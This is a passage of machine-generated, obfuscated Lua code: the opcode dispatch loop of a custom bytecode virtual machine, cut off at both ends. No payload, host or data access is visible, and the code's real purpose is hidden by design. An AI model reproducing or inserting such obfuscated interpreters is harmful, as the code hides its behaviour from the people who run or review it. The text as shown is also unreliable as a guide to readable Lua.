,Inst[4] do K=K   .. Stk[Idx] ;end Stk[Inst[2]]=K;VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else Stk[Inst[2]]=Stk[Inst[3]];end elseif (Enum<=139) then local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum>140) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end else local A=Inst[2];local B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];end elseif (Enum<=143) then if (Enum==142) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=144) then local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end elseif (Enum>145) then Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=151) then if (Enum<=148) then if (Enum==147) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end else local B;local A;Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=149) then local B;local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];do return;end elseif (Enum==150) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local A;Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=153) then if (Enum==152) then local Edx;local Results;local B;local A;A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Stk[A + 1 ])};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];end elseif (Enum<=154) then local A;Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]= #Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]] + Stk[Inst[4]] ;VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==155) then local B;local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Inst[4];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=235) then if (Enum<=195) then if (Enum<=175) then if (Enum<=165) then if (Enum<=160) then if (Enum<=158) then if (Enum>157) then local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3]~=0 ;VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]();VIP=VIP + 1 ;Inst=Instr[VIP];do return;end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];if (Stk[Inst[2]]~=Inst[4]) then VIP=VIP + 1 ;else VIP=Inst[3];end end elseif (Enum>159) then local B;local T;local A;Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Upvalues[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]][Inst[3]]=Stk[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]={};VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];T=Stk[A];B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];end elseif (Enum<=162) then if (Enum==161) then local A=Inst[2];Stk[A](Stk[A + 1 ]);else local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];end elseif (Enum<=163) then local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A]();elseif (Enum>164) then local A;A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A](Stk[A + 1 ]);VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local A=Inst[2];local T=Stk[A];local B=Inst[3];for Idx=1,B do T[Idx]=Stk[A + Idx ];end end elseif (Enum<=170) then if (Enum<=167) then if (Enum==166) then local Results;local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Stk[A + 1 ]));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results={Stk[A](Unpack(Stk,A + 1 ,Top))};Edx=0;for Idx=A,Inst[4] do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];else local B=Stk[Inst[4]];if  not B then VIP=VIP + 1 ;else Stk[Inst[2]]=B;VIP=Inst[3];end end elseif (Enum<=168) then local Edx;local Results,Limit;local B;local A;A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];VIP=Inst[3];elseif (Enum==169) then local A;A=Inst[2];Stk[A]=Stk[A]();VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];if Stk[Inst[2]] then VIP=VIP + 1 ;else VIP=Inst[3];end else local Edx;local Results,Limit;local B;local A;Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Inst[3]));VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];B=Stk[Inst[3]];Stk[A + 1 ]=B;Stk[A]=B[Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Inst[3];VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Results,Limit=_R(Stk[A](Unpack(Stk,A + 1 ,Inst[3])));Top=(Limit + A) -1 ;Edx=0;for Idx=A,Top do Edx=Edx + 1 ;Stk[Idx]=Results[Edx];end VIP=VIP + 1 ;Inst=Instr[VIP];A=Inst[2];Stk[A]=Stk[A](Unpack(Stk,A + 1 ,Top));VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Stk[Inst[3]][Inst[4]];VIP=VIP + 1 ;Inst=Instr[VIP];Env[Inst[3]]=Stk[Inst[2]];VIP=VIP + 1 ;Inst=Instr[VIP];Stk[Inst[2]]=Env[Inst[3]];VIP=VIP + 1 